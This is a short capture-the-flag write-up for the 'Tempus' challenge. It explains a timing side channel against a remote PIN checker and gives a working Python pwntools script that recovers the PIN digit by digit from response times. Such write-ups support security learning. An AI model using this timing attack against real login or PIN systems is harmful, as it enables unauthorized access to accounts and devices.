## Tempus

Tempus was quickly identified as a timing side channel (due to the name and the nature of the challenge).
All that was necessary was to measure the time between sending a character and retrieving a response. 

Doing this iteratively for all digits, would reveil one taking longer than the others. This was the correct digit for this location (most likely due to the algorithm going further in the computation).
Multiple repetitions were introduced to improve the accuracy and remove random fluctuations. The code below could be used to retrieve the pin iteratively.

```py
from pwn import *
import string
import numpy as np
import time

# Start timing
context.log_level = 'error'

HOST = "5dd561fc7be6e6a81a6f9aa198eac524.chal.ctf.ae"

results = {}
prev = "56295141"

repetitions = 5

for pinnum in range(10):
    duration = 0
    for l in range(repetitions):
        r = remote(HOST, 443, ssl=True, sni=HOST)
        prints = r.readline()
        start_time = time.perf_counter()
        r.sendline(bytearray(prev + str(pinnum), "ascii"))
        r.readline()
        r.readline()
        end_time = time.perf_counter()
        duration += (end_time - start_time) * 1000
        r.close()

    print(f"{pinnum} took {duration / repetitions} ms")
```
